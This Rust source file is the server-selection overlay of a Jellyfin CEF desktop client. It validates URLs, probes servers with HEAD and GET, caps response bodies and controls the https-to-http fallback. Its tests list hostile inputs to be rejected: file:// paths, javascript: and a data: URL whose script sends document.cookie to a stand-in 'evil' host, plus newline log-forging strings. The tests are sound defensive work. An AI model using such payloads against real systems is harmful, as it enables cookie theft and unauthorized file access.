// JfnCefLayer is an opaque internal handle; callers within this crate
// pass it back unchanged. Marking each consumer unsafe would cascade
// without adding type safety, so the lint is suppressed module-wide.
#![allow(clippy::not_unsafe_ptr_arg_deref)]

//! OverlayBrowser business logic.
//!
//! The server-selection overlay loads `app://resources/overlay.html` over the
//! main browser, drives a two-phase HEAD→GET probe of user-entered server
//! URLs, and either hands input back to the main browser (dismiss) or kicks
//! the main browser into a fresh load (navigate). One process-wide instance
//! held in [`INSTANCE`]; lifetime mirrors the main browser.

use cef::*;
use parking_lot::Mutex;
use std::os::raw::c_void;
use std::sync::Arc;
use std::sync::atomic::{AtomicU64, Ordering};

use crate::browsers::{jfn_browsers_create, jfn_browsers_set_active};
use crate::business_common::{apply_setting_value, reject_double_init};
use crate::client::{
    Inner, JfnCefLayer, jfn_cef_layer_create, jfn_cef_layer_inner, jfn_cef_layer_set_name,
    jfn_cef_layer_set_visible,
};
use crate::ipc::{BrowserMessage, list_opt_string, list_string, send_to_renderer};
use jfn_color::theme::jfn_theme_color_on_overlay_dismissed;
use jfn_jellyfin::{
    RedirectDecision, classify_probe_redirect, extract_base_url, is_http_url, is_valid_public_info,
    redirect_refused_message,
};

struct OverlayState {
    main_layer: Arc<Inner>,
    active_probe: Option<Urlrequest>,
    /// Generation of the probe that owns `active_probe`; `NO_PROBE` when
    /// nothing is in flight. A completion whose generation no longer matches
    /// belongs to a cancelled or superseded attempt and is dropped.
    active_probe_id: u64,
}

/// Generation value meaning "no probe in flight".
const NO_PROBE: u64 = 0;

static NEXT_PROBE_ID: AtomicU64 = AtomicU64::new(1);

static INSTANCE: Mutex<Option<OverlayState>> = Mutex::new(None);

// ---- pure input validation ------------------------------------------------
//
// Everything the overlay page can hand the browser process goes through one of
// these first. They are pure so the rules are testable without CEF.

/// Cap on the bytes accumulated from a probe response. `/System/Info/Public`
/// is a few hundred bytes; a hostile or misconfigured server answering the
/// probe with an endless stream must not grow the browser process without
/// bound. Truncation makes the JSON unparseable, so the probe simply fails.
const PROBE_BODY_LIMIT: usize = 64 * 1024;

/// Append `data` to `body`, stopping at `cap` bytes. Returns false once the
/// cap has been reached (i.e. some bytes were dropped).
fn append_capped(body: &mut Vec<u8>, data: &[u8], cap: usize) -> bool {
    let room = cap.saturating_sub(body.len());
    if room == 0 {
        return false;
    }
    let take = room.min(data.len());
    body.extend_from_slice(&data[..take]);
    take == data.len()
}

/// How long the speculative `https` attempt for a bare host gets before it is
/// abandoned for `http`. The probe has no timeout of its own, so this is the
/// shorter of the two the decision allows.
///
/// It only has to cover the common failure shapes — a TLS handshake against a
/// plain-http port, a refused connection, a reset — which all answer in
/// milliseconds on a LAN or a tailnet. It exists for the one that does not: a
/// port that silently drops packets.
const HTTPS_ATTEMPT_TIMEOUT_MS: i64 = 2000;

/// The URLs a `checkServerConnectivity` request may fetch, in the order they
/// are tried; empty when the input is not something this client will send a
/// request to.
///
/// One entry for a typed scheme — a typed `http://` is never silently
/// upgraded. Two for a bare host: `https://host` first, then `http://host`,
/// so `192.168.1.10:8096` or a tailnet name still connects over plain http
/// once the https attempt has failed.
fn probe_urls(user_input: &str) -> Vec<String> {
    jfn_jellyfin::probe_candidates(user_input)
        .into_iter()
        .filter(|u| is_http_url(u))
        .collect()
}

/// The notice the connect screen shows for a probe that ended on `base`.
///
/// `"insecure-http"` only when the address was typed without a scheme, the
/// https attempt failed and the saved URL is therefore plain http — the one
/// case where the user did not ask for an unencrypted connection and got one.
fn probe_notice(base: &str, fell_back_to_http: bool) -> &'static str {
    if fell_back_to_http && !base.to_ascii_lowercase().starts_with("https://") {
        NOTICE_INSECURE
    } else {
        ""
    }
}

/// The `serverConnectivityResult` detail value that means "this connection is
/// plain http because the https attempt failed". `overlay.js` turns it into
/// the one-line note on the connect screen.
const NOTICE_INSECURE: &str = "insecure-http";

/// The URL the main browser may be told to load. The main layer has the
/// native bridge injected, so only http(s) documents may ever land there.
fn navigable_url(candidate: &str) -> Option<&str> {
    is_http_url(candidate).then_some(candidate)
}

/// The URL that may be written to `settings.json` as the saved server. Empty
/// is allowed: that is how the settings page clears the saved server.
pub(crate) fn storable_server_url(candidate: &str) -> Option<&str> {
    (candidate.is_empty() || is_http_url(candidate)).then_some(candidate)
}

/// The second-phase probe URL for a resolved base.
fn system_info_url(base: &str) -> String {
    format!("{base}/System/Info/Public")
}

/// Create the overlay layer over `main_layer`, install handlers, load the
/// overlay URL. Called once after the main browser is created.
pub fn jfn_overlay_init(main_layer: *mut JfnCefLayer) {
    if main_layer.is_null() {
        return;
    }
    if reject_double_init(&INSTANCE.lock(), "jfn_overlay_init") {
        return;
    }

    let kind = c"overlay";
    let layer = unsafe { jfn_browsers_create(kind.as_ptr()) };
    if layer.is_null() {
        return;
    }

    let name = c"overlay";
    unsafe { jfn_cef_layer_set_name(layer, name.as_ptr()) };

    let inner = unsafe { jfn_cef_layer_inner(layer) };
    install_handlers(layer, Arc::clone(&inner));

    unsafe {
        jfn_cef_layer_set_visible(layer, true);
        let url = "app://resources/overlay.html";
        jfn_cef_layer_create(layer, url.as_ptr() as *const _, url.len());
    }

    let main_inner = unsafe { jfn_cef_layer_inner(main_layer) };
    *INSTANCE.lock() = Some(OverlayState {
        main_layer: main_inner,
        active_probe: None,
        active_probe_id: NO_PROBE,
    });
}

fn install_handlers(layer: *mut JfnCefLayer, inner_for_created: Arc<Inner>) {
    let l = unsafe { &*layer };

    // Created → overlay wins input.
    l.set_created_callback_rust(Some(Box::new(move |_b: *mut c_void| {
        let p = inner_for_created.layer_ptr();
        if !p.is_null() {
            jfn_browsers_set_active(p);
        }
    })));

    l.set_message_handler_rust(Some(Box::new(handle_message)));

    // BeforeClose: clear INSTANCE so post-close cancel/IPC paths no-op
    // instead of touching a torn-down main browser handle.
    l.set_before_close_callback_rust(Some(Box::new(|| {
        cancel_active_probe();
        *INSTANCE.lock() = None;
    })));

    l.set_context_menu_builder_rust(Some(crate::app_menu::build_closure()));
    l.set_context_menu_dispatcher_rust(Some(crate::app_menu::dispatch_closure()));
}

fn main_layer_arc() -> Option<Arc<Inner>> {
    INSTANCE.lock().as_ref().map(|s| Arc::clone(&s.main_layer))
}

fn handle_message(message: BrowserMessage) -> bool {
    let args = message.args();

    match message.name() {
        "getSavedServerUrl" => {
            let Some(frame) = message.main_frame() else {
                return true;
            };
            let url = jfn_config::server_url();
            send_to_renderer(&frame, "savedServerUrl", |args| {
                args.set_string(0, Some(&CefString::from(url.as_str())));
            });
            true
        }
        "navigateMain" => {
            let Some(args) = args else { return true };
            let url = list_string(args, 0);
            let Some(url) = navigable_url(&url) else {
                jfn_logging::log(
                    jfn_logging::CATEGORY_CEF,
                    jfn_logging::LEVEL_WARN,
                    &format!(
                        "Overlay: navigateMain rejected non-http(s) URL ({} bytes)",
                        url.len()
                    ),
                );
                return true;
            };
            jfn_logging::log(
                jfn_logging::CATEGORY_CEF,
                jfn_logging::LEVEL_INFO,
                &format!(
                    "Overlay: navigateMain {}",
                    jfn_logging::escape_page_string(url)
                ),
            );
            jfn_config::set_server_url(url);
            // Synchronous, not queued: a renderer process spawned by the
            // navigation below reads `settings.json` to decide whether the
            // document it is about to host gets `window.jmpNative`
            // (`app::bridge_allowed_for`), so the new server URL has to be on
            // disk before the load starts. One small atomic write, once per
            // connect.
            jfn_config::settings_save();
            if let Some(ml) = main_layer_arc() {
                ml.load_url(url);
            }
            true
        }
        "dismissOverlay" => {
            jfn_logging::log(
                jfn_logging::CATEGORY_CEF,
                jfn_logging::LEVEL_INFO,
                "Overlay: dismissOverlay",
            );
            let Some(ml) = main_layer_arc() else {
                return true;
            };
            let p = ml.layer_ptr();
            if !p.is_null() {
                jfn_browsers_set_active(p);
            }
            jfn_theme_color_on_overlay_dismissed();
            true
        }
        "saveServerUrl" => {
            let Some(args) = args else { return true };
            let url = list_string(args, 0);
            let Some(url) = storable_server_url(&url) else {
                jfn_logging::log(
                    jfn_logging::CATEGORY_CEF,
                    jfn_logging::LEVEL_WARN,
                    &format!(
                        "Overlay: saveServerUrl rejected non-http(s) URL ({} bytes)",
                        url.len()
                    ),
                );
                return true;
            };
            jfn_config::set_server_url(url);
            jfn_config::settings_save_async();
            true
        }
        "setSettingValue" => {
            let Some(args) = args else { return true };
            let section = list_string(args, 0);
            let key = list_string(args, 1);
            let value = list_opt_string(args, 2);
            apply_setting_value(&section, &key, value.as_deref());
            true
        }
        "checkServerConnectivity" => {
            let Some(args) = args else { return true };
            let Some(b) = message.browser().cloned() else {
                return true;
            };
            let url = list_string(args, 0);
            cancel_active_probe();
            let candidates = probe_urls(&url);
            if candidates.is_empty() {
                // Never issue a CEF request for a scheme this client will not
                // navigate to (file:, app:, chrome:, ...). Answer the page
                // directly so its promise settles instead of hanging.
                jfn_logging::log(
                    jfn_logging::CATEGORY_CEF,
                    jfn_logging::LEVEL_WARN,
                    &format!(
                        "Overlay: checkServerConnectivity rejected non-http(s) URL ({} bytes)",
                        url.len()
                    ),
                );
                send_probe_result(&b, &url, false, &url, "");
                return true;
            }
            start_probe(b, url, candidates);
            true
        }
        "cancelServerConnectivity" => {
            cancel_active_probe();
            // Kill the pre-load.
            if let Some(ml) = main_layer_arc() {
                ml.reset();
            }
            true
        }
        _ => false,
    }
}

/// Cancel whatever probe is in flight and retire its generation, so a late
/// `OnRequestComplete` for it neither replies to the page nor touches the
/// slot a newer probe may already own.
fn cancel_active_probe() {
    let probe = {
        let mut guard = INSTANCE.lock();
        match guard.as_mut() {
            Some(s) => {
                s.active_probe_id = NO_PROBE;
                s.active_probe.take()
            }
            None => None,
        }
    };
    if let Some(p) = probe {
        p.cancel();
    }
}

/// True while `id` is the generation the overlay is waiting on.
fn probe_is_current(id: u64) -> bool {
    INSTANCE
        .lock()
        .as_ref()
        .is_some_and(|s| s.active_probe_id == id)
}

/// Hand the in-flight request for generation `id` to the cancel path — but
/// only while `id` is still current, so a superseded probe cannot re-arm the
/// slot or overwrite a newer probe's request.
fn store_probe_request(id: u64, request: Urlrequest) {
    if let Some(s) = INSTANCE.lock().as_mut()
        && s.active_probe_id == id
    {
        s.active_probe = Some(request);
    }
}

/// Retire generation `id` once it has produced a result, so a later
/// `cancel()` is a no-op rather than aborting somebody else's request.
fn finish_probe(id: u64) {
    if let Some(s) = INSTANCE.lock().as_mut()
        && s.active_probe_id == id
    {
        s.active_probe_id = NO_PROBE;
        s.active_probe = None;
    }
}

fn send_probe_result(
    browser: &Browser,
    user_url: &str,
    success: bool,
    reply_url: &str,
    detail: &str,
) {
    let Some(frame) = browser.main_frame() else {
        return;
    };
    send_to_renderer(&frame, "serverConnectivityResult", |args| {
        args.set_string(0, Some(&CefString::from(user_url)));
        args.set_bool(1, i32::from(success));
        args.set_string(2, Some(&CefString::from(reply_url)));
        // Slot 3: on success a notice key for the connect screen; on failure
        // a message to show instead of the generic one.
        args.set_string(3, Some(&CefString::from(detail)));
    });
}

fn start_probe(browser: Browser, user_url: String, candidates: Vec<String>) {
    let probe = ServerProbeClient::new(
        candidates,
        Box::new(move |success, base_url, detail| {
            let reply_url = if success { &base_url } else { &user_url };
            send_probe_result(&browser, &user_url, success, reply_url, &detail);
        }),
    );
    probe.start();
}

// ---- ServerProbeClient ----------------------------------------------------
//
// For each candidate URL in turn: HEAD to see where the address resolves,
// then GET {base}/System/Info/Public to confirm it's a Jellyfin server. A
// redirect is followed only while it stays on the host that was asked for
// (see `jfn_jellyfin::classify_probe_redirect`); a candidate that fails hands
// over to the next one, which is how a bare host falls back from https to
// http. Cancellable: .cancel() aborts the active CefURLRequest; a late
// OnRequestComplete with the slot cleared is harmless.

type ProbeCallback = Box<dyn FnMut(bool, String, String) + Send + Sync>;

struct ProbeState {
    id: u64,
    /// The URLs to try, in order. More than one only for a bare host, where
    /// entry 0 is the speculative https attempt.
    candidates: Vec<String>,
    index: usize,
    phase: Phase,
    base: String,
    body: Vec<u8>,
    /// Set by the timeout task when the current candidate ran out of time;
    /// makes the completion that the cancel produces a candidate failure
    /// rather than a step to the GET phase.
    timed_out: bool,
    /// A redirect this probe refused. Terminal: no further candidate is tried,
    /// because the user has an address to enter instead.
    refusal: Option<String>,
    callback: Option<ProbeCallback>,
}

impl ProbeState {
    /// The URL the current candidate is probing.
    fn url(&self) -> String {
        self.candidates.get(self.index).cloned().unwrap_or_default()
    }

    /// True once at least one earlier candidate has been abandoned — i.e. the
    /// https attempt for a bare host failed and this is the http one.
    fn fell_back(&self) -> bool {
        self.index > 0
    }
}

#[derive(Copy, Clone, PartialEq)]
enum Phase {
    Head,
    Get,
}

struct ServerProbeClient {
    state: Arc<Mutex<ProbeState>>,
}

impl ServerProbeClient {
    fn new(candidates: Vec<String>, callback: ProbeCallback) -> Self {
        Self {
            state: Arc::new(Mutex::new(ProbeState {
                id: NEXT_PROBE_ID.fetch_add(1, Ordering::Relaxed),
                candidates,
                index: 0,
                phase: Phase::Head,
                base: String::new(),
                body: Vec::new(),
                timed_out: false,
                refusal: None,
                callback: Some(callback),
            })),
        }
    }

    fn start(&self) {
        let id = self.state.lock().id;
        // Claim the generation before the request exists: OnRequestComplete
        // must never run against a slot that still says NO_PROBE.
        if let Some(s) = INSTANCE.lock().as_mut() {
            s.active_probe_id = id;
            s.active_probe = None;
        }
        start_candidate(&self.state);
    }
}

/// Issue the HEAD for whatever candidate the state is on, arming the timeout
/// when this candidate is a speculative https attempt.
fn start_candidate(state: &Arc<Mutex<ProbeState>>) {
    let (url, id, index, speculative) = {
        let st = state.lock();
        (st.url(), st.id, st.index, st.candidates.len() > 1)
    };
    if url.is_empty() {
        finish_probe(id);
        return;
    }
    let client = JfnServerProbeClient::new(Arc::clone(state));
    match make_request("HEAD", &url, client) {
        Some(r) => store_probe_request(id, r),
        None => {
            finish_probe(id);
            return;
        }
    }
    // Only the attempt the user did not ask for is time-boxed: a typed
    // address gets the client's usual, unbounded wait.
    if speculative && index == 0 {
        let mut task = ProbeTimeoutTask::new(Arc::clone(state), index);
        let _ = post_delayed_task(ThreadId::UI, Some(&mut task), HTTPS_ATTEMPT_TIMEOUT_MS);
    }
}

/// Abandon candidate `index` if it is still the one in flight.
fn on_probe_timeout(state: &Arc<Mutex<ProbeState>>, index: usize) {
    let id = {
        let mut st = state.lock();
        if st.index != index || st.callback.is_none() {
            return;
        }
        st.timed_out = true;
        st.id
    };
    if !probe_is_current(id) {
        return;
    }
    // Take the request out rather than going through `cancel_active_probe`:
    // the generation must stay current so the completion this produces is
    // seen as *this candidate* failing, not as the whole probe being cancelled.
    let request = INSTANCE.lock().as_mut().and_then(|s| {
        (s.active_probe_id == id)
            .then(|| s.active_probe.take())
            .flatten()
    });
    if let Some(r) = request {
        r.cancel();
    }
}

fn on_complete(state: &Arc<Mutex<ProbeState>>, request: &Urlrequest) {
    let id = state.lock().id;
    // Cancelled, or superseded by a newer connect attempt: drop the result
    // rather than reply for a URL nobody is waiting on (and, worse, clear the
    // slot that now belongs to the newer probe).
    if !probe_is_current(id) {
        return;
    }

    // HEAD phase: decide where the address resolved to, then GET
    // /System/Info/Public on it.
    let next_request = {
        let mut st = state.lock();
        if st.phase == Phase::Head && !st.timed_out {
            let requested = st.url();
            let final_url = request
                .response()
                .map(|resp| {
                    let url_uf = resp.url();
                    let cs: CefString = (&url_uf).into();
                    cs.to_string()
                })
                .unwrap_or_default();
            // A redirect chain decides that URL, so it is bound back to the
            // host that was asked for before it becomes the base we fetch,
            // save and navigate to.
            let resolved = match classify_probe_redirect(&requested, &final_url) {
                RedirectDecision::Keep => requested,
                RedirectDecision::Upgrade(upgraded) => upgraded,
                RedirectDecision::Refuse(target) => {
                    st.refusal = Some(redirect_refused_message(&target));
                    String::new()
                }
            };
            if resolved.is_empty() {
                None
            } else {
                st.base = extract_base_url(&resolved).to_string();
                st.phase = Phase::Get;
                let next_url = system_info_url(&st.base);
                let client = JfnServerProbeClient::new(Arc::clone(state));
                make_request("GET", &next_url, client)
            }
        } else {
            None
        }
    };
    if let Some(r) = next_request {
        // Register the GET too: without it, a cancel arriving during the
        // second phase had nothing to abort.
        store_probe_request(id, r);
        return;
    }

    // This candidate is done: validate the body, then either hand over to the
    // next candidate or reply.
    let outcome = {
        let mut st = state.lock();
        let mut ok = false;
        if st.phase == Phase::Get && !st.timed_out && st.refusal.is_none() {
            let status = request.request_status();
            if status.as_ref() == &sys::cef_urlrequest_status_t::UR_SUCCESS
                && let Some(resp) = request.response()
                && resp.status() == 200
            {
                ok = is_valid_public_info(&st.body);
            }
        }
        if ok {
            let detail = probe_notice(&st.base, st.fell_back()).to_string();
            Outcome::Done {
                success: true,
                base: st.base.clone(),
                detail,
                callback: st.callback.take(),
            }
        } else if st.refusal.is_none() && st.index + 1 < st.candidates.len() {
            // The speculative https attempt failed, however it failed (TLS
            // error, refused, reset, timeout). Swallow it and try http.
            st.index += 1;
            st.phase = Phase::Head;
            st.base.clear();
            st.body.clear();
            st.timed_out = false;
            Outcome::Next
        } else {
            let detail = st.refusal.clone().unwrap_or_default();
            Outcome::Done {
                success: false,
                base: st.base.clone(),
                detail,
                callback: st.callback.take(),
            }
        }
    };

    match outcome {
        Outcome::Next => start_candidate(state),
        Outcome::Done {
            success,
            base,
            detail,
            callback,
        } => {
            // Retire the generation before replying, so a cancel() racing the
            // reply is a no-op instead of aborting a finished request.
            finish_probe(id);
            if let Some(mut f) = callback {
                f(success, base, detail);
            }
        }
    }
}

/// What `on_complete` decided for the candidate that just finished.
enum Outcome {
    /// Try the next candidate.
    Next,
    /// Reply to the page.
    Done {
        success: bool,
        base: String,
        detail: String,
        callback: Option<ProbeCallback>,
    },
}

cef::wrap_task! {
    struct ProbeTimeoutTask {
        state: Arc<Mutex<ProbeState>>,
        index: usize,
    }
    impl Task {
        fn execute(&self) {
            on_probe_timeout(&self.state, self.index);
        }
    }
}

fn make_request(method: &str, url: &str, client: UrlrequestClient) -> Option<Urlrequest> {
    let req: Request = request_create()?;
    req.set_url(Some(&CefString::from(url)));
    req.set_method(Some(&CefString::from(method)));
    let mut req_arg = req;
    let mut client_arg = client;
    urlrequest_create(Some(&mut req_arg), Some(&mut client_arg), None)
}

cef::wrap_urlrequest_client! {
    struct JfnServerProbeClient {
        state: Arc<Mutex<ProbeState>>,
    }

    impl UrlrequestClient {
        fn on_request_complete(&self, request: Option<&mut Urlrequest>) {
            let Some(req) = request else { return };
            on_complete(&self.state, req);
        }
        fn on_download_data(
            &self,
            _request: Option<&mut Urlrequest>,
            data: *const u8,
            data_length: usize,
        ) {
            let mut st = self.state.lock();
            if st.phase == Phase::Get && !data.is_null() && data_length > 0 {
                let slice = unsafe { std::slice::from_raw_parts(data, data_length) };
                append_capped(&mut st.body, slice, PROBE_BODY_LIMIT);
            }
        }
    }
}

// ---- tests ----
//
// Only the pure input rules are covered here; the CEF-bound halves
// (`jfn_overlay_init`, `handle_message`, `on_complete`) need a live browser
// and are exercised by the E2E suite.

#[cfg(test)]
mod tests {
    use super::*;

    // The two shapes the owner requires to keep working verbatim.
    const IP_PORT: &str = "http://192.168.1.10:8096";
    const TAILNET: &str = "http://thehalfrican-truenas.tail1cdca8.ts.net:8096";

    #[test]
    fn probe_urls_tries_https_before_http_for_a_bare_host() {
        // Renamed from `probe_url_normalizes_a_plain_host`: a bare host now
        // produces two candidates, https first, instead of one http URL.
        assert_eq!(
            probe_urls("example.com"),
            vec![
                "https://example.com".to_string(),
                "http://example.com".to_string()
            ]
        );
        assert_eq!(
            probe_urls("192.168.1.10:8096"),
            vec!["https://192.168.1.10:8096".to_string(), IP_PORT.to_string()]
        );
        assert_eq!(
            probe_urls("thehalfrican-truenas.tail1cdca8.ts.net:8096"),
            vec![
                "https://thehalfrican-truenas.tail1cdca8.ts.net:8096".to_string(),
                TAILNET.to_string()
            ]
        );
        assert_eq!(
            probe_urls("[::1]:8096"),
            vec![
                "https://[::1]:8096".to_string(),
                "http://[::1]:8096".to_string()
            ]
        );
    }

    #[test]
    fn probe_urls_leaves_a_typed_scheme_exactly_as_typed() {
        // A typed `http://` is never quietly upgraded: the LAN and tailnet
        // addresses the user types with a scheme produce one plain-http
        // request, as they always did.
        assert_eq!(probe_urls(IP_PORT), vec![IP_PORT.to_string()]);
        assert_eq!(probe_urls(TAILNET), vec![TAILNET.to_string()]);
        assert_eq!(
            probe_urls("  HTTPS://example.com:8096/web/index.html "),
            vec!["https://example.com:8096/web/index.html".to_string()]
        );
    }

    #[test]
    fn probe_urls_refuses_every_scheme_but_http_and_https() {
        // The probe is a CEF URL request issued by the browser process: a
        // `file:` or `app:` target would read local/app resources on behalf
        // of whatever the overlay page asked for.
        for hostile in [
            "file:///C:/Windows/win.ini",
            "FILE://///attacker/share/x",
            "app://resources/overlay.html",
            "chrome://settings",
            "devtools://devtools/bundled/inspector.html",
            "blob://x",
        ] {
            assert!(probe_urls(hostile).is_empty(), "input {hostile:?}");
        }
        // Degenerate input never produces a request either.
        assert!(probe_urls("").is_empty());
        assert!(probe_urls("   ").is_empty());
        assert!(probe_urls("://").is_empty());
    }

    #[test]
    fn probe_notice_fires_only_for_a_silent_fallback_to_http() {
        // Bare host, https attempt failed, saved URL is plain http.
        assert_eq!(probe_notice(IP_PORT, true), "insecure-http");
        assert_eq!(probe_notice(TAILNET, true), "insecure-http");
        // A typed address (no fallback) is the user's own choice: no note.
        assert_eq!(probe_notice(IP_PORT, false), "");
        // A bare host that reached https, however it got there, is encrypted.
        assert_eq!(probe_notice("https://example.com", true), "");
        assert_eq!(probe_notice("HTTPS://example.com:8920", true), "");
    }

    #[test]
    fn navigable_url_gates_the_main_layer_to_http() {
        assert_eq!(
            navigable_url("https://host/jellyfin/"),
            Some("https://host/jellyfin/")
        );
        for hostile in [
            "file:///C:/Users/x/Desktop/evil.html",
            "app://resources/overlay.html",
            "chrome://version",
            "javascript:alert(1)",
            "data:text/html,<script>fetch('http://evil/'+document.cookie)</script>",
            "",
        ] {
            assert_eq!(navigable_url(hostile), None, "input {hostile:?}");
        }
    }

    #[test]
    fn navigable_url_rejects_a_newline_that_would_forge_a_log_line() {
        // `navigateMain` logs the URL verbatim.
        assert_eq!(
            navigable_url("http://host/\nERROR   [Main] wiped the disk"),
            None
        );
        assert_eq!(navigable_url("http://host/\r\nX-Injected: 1"), None);
    }

    #[test]
    fn storable_server_url_allows_the_empty_clearing_value() {
        // client-settings.js calls saveServerUrl('') to forget the server.
        assert_eq!(storable_server_url(""), Some(""));
        assert_eq!(storable_server_url("http://host"), Some("http://host"));
        assert_eq!(storable_server_url("file:///etc/passwd"), None);
        assert_eq!(storable_server_url("app://resources/overlay.html"), None);
    }

    #[test]
    fn system_info_url_appends_the_probe_path() {
        assert_eq!(
            system_info_url("https://host:8096/jellyfin"),
            "https://host:8096/jellyfin/System/Info/Public"
        );
        assert_eq!(
            system_info_url("http://host"),
            "http://host/System/Info/Public"
        );
    }

    #[test]
    fn append_capped_stops_at_the_limit() {
        let mut body = Vec::new();
        assert!(append_capped(&mut body, b"abc", 8));
        assert!(append_capped(&mut body, b"defgh", 8));
        assert_eq!(body, b"abcdefgh");
        // Full: further chunks are dropped and the caller is told so.
        assert!(!append_capped(&mut body, b"ijk", 8));
        assert_eq!(body.len(), 8);
    }

    #[test]
    fn append_capped_truncates_a_chunk_that_straddles_the_limit() {
        let mut body = Vec::new();
        assert!(!append_capped(&mut body, b"abcdefghij", 4));
        assert_eq!(body, b"abcd");
    }

    #[test]
    fn append_capped_bounds_an_endless_hostile_body() {
        // A server that answers /System/Info/Public with a never-ending
        // stream must not grow the browser process without bound.
        let mut body = Vec::new();
        let chunk = vec![b'A'; 8 * 1024];
        for _ in 0..4096 {
            append_capped(&mut body, &chunk, PROBE_BODY_LIMIT);
        }
        assert_eq!(body.len(), PROBE_BODY_LIMIT);
        // And the truncated body is not mistaken for a valid server answer.
        assert!(!is_valid_public_info(&body));
    }

    #[test]
    fn append_capped_handles_a_zero_cap_and_an_empty_chunk() {
        let mut body = Vec::new();
        assert!(!append_capped(&mut body, b"a", 0));
        assert!(body.is_empty());
        assert!(append_capped(&mut body, b"", 4));
        assert!(body.is_empty());
    }
}
